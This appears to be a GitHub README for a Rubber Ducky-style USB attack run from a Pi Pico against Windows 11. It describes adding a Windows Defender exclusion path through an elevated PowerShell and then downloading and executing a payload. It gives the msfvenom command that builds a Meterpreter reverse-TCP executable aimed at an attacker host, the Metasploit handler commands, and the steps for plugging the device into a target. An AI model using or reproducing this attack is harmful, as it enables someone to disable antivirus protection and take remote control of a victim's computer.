Windows Defender ExclusionPath + ReverseShell
=============================================

This scrip will run PowerShell as administrator privilege and add directory of current User into Microsoft Windows Defender Exclusion. Then PowerShell will download payload file and run the payload. Last, exit the PowerShell.

1. Create payload using msfvenom in kali linux:
> $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=attacker_IP lport=port -f exe -o windowsx64.exe
  
2. Upload your payload
  
3. Run Metasploit on Kali Linux:
> $ msfconsole <br />
> $ use exploit/multi/handler <br />
> $ set payload windows/x64/meterpreter/reverse_tcp <br />
> $ set LHOST attacker_IP <br />
> $ set LPORT port <br />
> $ run
  
4. Copy payload.dd script to Pi Pico.
  
5. Open payload.dd, edit URL and save.
  
5. Connect RubberDucky to Target Machine.
  
P/S : Tested on Windows 11 Version 21H1(OS Build 22000.348)
  
![Win Ver](https://github.com/auffAzani/RubberDucky/blob/main/%5BWin11%5D%20Windows%20Defender%20ExclusionPath%20%2B%20ReverseShell/WinVer.png)
